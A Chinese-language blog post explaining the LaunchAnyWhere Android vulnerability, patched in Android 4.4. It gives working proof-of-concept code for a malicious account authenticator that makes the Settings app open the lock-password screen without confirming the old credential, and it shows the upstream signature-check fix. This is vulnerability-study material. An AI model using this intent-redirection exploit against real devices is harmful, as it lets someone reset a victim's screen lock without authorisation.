# LaunchAnyWhere
4.3及以下的一个系统漏洞

>本文仅供安全技术交流,请勿用于不正当的用途,造成的一切后果与本文作者无关.

### 0x00 前言
最近看了一点儿系统安全相关的东西,想了解一下java序列化反序列化的东西,正好看到LaunchAnyWhere这个比较经典的漏洞,也尝试了一下,触发机制和原理都比较简单,但是危害也不小.所以这里也顺手记下来.

再顺带提一下,这个漏洞在Android4.3之后就失效了~

### 0x01 背景知识
#### 1.Android 账户系统
Android2.0中加入了一个新的包android.accounts，该包主要包括了集中式的账户管理API，用以安全地存储和访问认证的令牌和密码，比如，我们的手机存在多个账户，每个账户下面都有不同的信息，甚至每个账户都可以与不同的服务器之间进行数据同步（例如，手机账户中的联系人可以是一个Gmail账户中的通讯录，可联网进行同步更新）

#### 2.Android中添加账户的基本流程
比如现在有两个app,appA需要使用到appB中的账户信息,而appB本身也提供了这种功能,那么就可以进行添加账户的操作.<br>
普通应用（记为AppA）去请求添加某类账户时，会调用AccountManager.addAccount,然后AccountManager会去查找提供账号的应用（记为AppB）的Authenticator类，调用Authenticator. addAccount方法；AppA再根据AppB返回的Intent去调起AppB的账户登录界面。<br>
整个流程如下图所示:

![](http://retme.net/usr/uploads/image/20140820/20140820062918_12778.png)

我们带着图缕一下流程,首先appA请求添加账户,然后系统发现appb可以提供这个账户服务,就去请求b,b返回一个intent给系统,系统返回给a,a启动这个页面.

#### 3.安全隐患
将上面的东西总结成一句话就是:<br>
使用appA打开appB指定的一个界面<br>
那这里就有一个比较明显的安全问题,如果appA是具有较高权限的系统级应用,那这里是不是就可以通过指定appB返回的intent的内容来打开任意界面了,甚至是本身不导出的?<br>

### 0x02 实现
按照上面提到的信息,我们尝试一下,打开一个比较重要的界面,去实现无密码的情况下,对pin码进行重置.<br>
这里是需要一些Android开发的相关知识的,贴一篇别人的博客,这里就不赘述了.<br>
https://blog.csdn.net/kifile/article/details/40949975

首先我们需要新建一个属于自己的提供帐号服务的类
```
public class MyAccountService extends Service {

    private MyAuthenticator myAuthenticator;

    public MyAccountService() {
    }

    @Override
    public void onCreate() {
        super.onCreate();
        myAuthenticator = new MyAuthenticator(this);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return myAuthenticator.getIBinder();
    }
}
```
实现的功能也比较简单,就是在onBind返回一个IBinder,然后再实现一个自己的AbstractAccountAuthenticator类
```
public class MyAuthenticator extends AbstractAccountAuthenticator {
    private final static String TAG = MyAuthenticator.class.getName();

    public MyAuthenticator(Context context) {
        super(context);
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse accountAuthenticatorResponse, String s) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse accountAuthenticatorResponse, String s, String s1, String[] strings, Bundle bundle) throws NetworkErrorException {
        Log.i(TAG, "addAccount: ");
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "com.android.settings",
                "com.android.settings.ChooseLockPassword"));
        intent.setAction(Intent.ACTION_RUN);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("confirm_credentials",false);
        bundle.putParcelable(AccountManager.KEY_INTENT, intent);

        return bundle;
    }

}
```
当appA向b发起添加账户的请求后,appb就会调用addacount将包含对应信息的bundle返回,这个地发就是利用的关键,我们将这个组件指定为设置pin码的界面,也就是希望能使用appa调起重置pin码的界面.

最后不要忘了添加权限
```
<uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS" />
```

然后就是安装app了,安装完成后打开设置->添加账户,可以看到里面已经有了我们刚刚写的应用的选项

![](https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-06-11%2022-38-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true)

点击这个列表项

![](https://github.com/EggUncle/Demo/blob/master/markdownimg/2018-06-11%2022-39-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png?raw=true)

### 0x03 修复方案
这个漏洞在Android4.4上就被修复了,修复的方式是在b给a返回bundle的时候,检查这个bundle启动的组件的信息签名是不是和b一致.
```
2186        @Override
2187        public void onResult(Bundle result) {
2188            mNumResults++;
2189            Intent intent = null;
2190            if (result != null
2191                    && (intent = result.getParcelable(AccountManager.KEY_INTENT)) != null) {
2192                /*
2193                 * The Authenticator API allows third party authenticators to
2194                 * supply arbitrary intents to other apps that they can run,
2195                 * this can be very bad when those apps are in the system like
2196                 * the System Settings.
2197                 */
2198                int authenticatorUid = Binder.getCallingUid();
2199                long bid = Binder.clearCallingIdentity();
2200                try {
2201                    PackageManager pm = mContext.getPackageManager();
2202                    ResolveInfo resolveInfo = pm.resolveActivityAsUser(intent, 0, mAccounts.userId);
2203                    int targetUid = resolveInfo.activityInfo.applicationInfo.uid;
2204                    if (PackageManager.SIGNATURE_MATCH !=
2205                            pm.checkSignatures(authenticatorUid, targetUid)) {
2206                        throw new SecurityException(
2207                                "Activity to be started with KEY_INTENT must " +
2208                               "share Authenticator's signatures");
2209                    }
2210                } finally {
2211                    Binder.restoreCallingIdentity(bid);
2212                }
2213            }
.............................
2264        }

```

### 0x04 参考
http://retme.net/index.php/2014/08/20/launchAnyWhere.html  <br>
http://www.droidsec.cn/bundle%E9%A3%8E%E6%B0%B4-android%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%8C%B9%E9%85%8D%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/ 
